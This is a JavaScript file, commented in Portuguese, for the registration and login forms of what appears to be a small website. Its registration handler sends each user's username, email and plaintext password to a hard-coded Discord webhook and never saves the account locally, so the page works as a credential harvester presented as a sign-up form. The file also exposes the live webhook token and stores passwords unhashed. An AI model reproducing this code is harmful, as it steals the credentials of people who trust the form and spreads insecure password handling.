const discordWebhookUrl = 'https://discord.com/api/webhooks/1290470700641030176/6lh2nbEkE9fzQ0u9x8dBf2gI1fzulxpC0CUEZU8VloGlyfhdNlXAPnfbw0kWKCcrIZHt'; // Substitua pela sua URL do webhook do Discord

function getRegisteredUsers() {
    const users = localStorage.getItem('registeredUsers');
    return users ? JSON.parse(users) : [];
}

function saveUser(username, email, password) {
    const users = getRegisteredUsers();
    users.push({ username, email, password });
    localStorage.setItem('registeredUsers', JSON.stringify(users));
}

async function sendToDiscord(username, email, password) {
    const data = {
        content: `**Novo Registro**\nUsuário: ${username}\nEmail: ${email}\nSenha: ${password}`
    };

    try {
        const response = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        if (!response.ok) {
            throw new Error('Falha ao enviar dados para o Discord');
        }
    } catch (error) {
        console.error("Erro ao enviar dados para o Discord:", error);
    }
}

// Registro de usuário
document.getElementById('register-form')?.addEventListener('submit', async (event) => {
    event.preventDefault();

    const username = document.getElementById('register-username').value;
    const email = document.getElementById('register-email').value;
    const password = document.getElementById('register-password').value;

    const existingUsers = getRegisteredUsers();

    if (existingUsers.some(user => user.username === username)) {
        document.getElementById('register-error').textContent = 'Nome de usuário já existe. Por favor, escolha outro.';
    } else {
        await sendToDiscord(username, email, password);
        alert('Registro bem-sucedido! Por favor, faça login.');
        window.location.href = 'index.html'; // Redirecionar para a página de login após o registro
    }
});

// Login
document.getElementById('login-form')?.addEventListener('submit', (event) => {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const registeredUsers = getRegisteredUsers();
    const user = registeredUsers.find(user => user.username === username && user.password === password);

    if (user) {
        alert('Login bem-sucedido! Redirecionando...');
        window.location.href = 'main.html'; // Redirecionar para a página principal
    } else {
        document.getElementById('login-error').textContent = 'Nome de usuário ou senha inválidos.';
    }
});
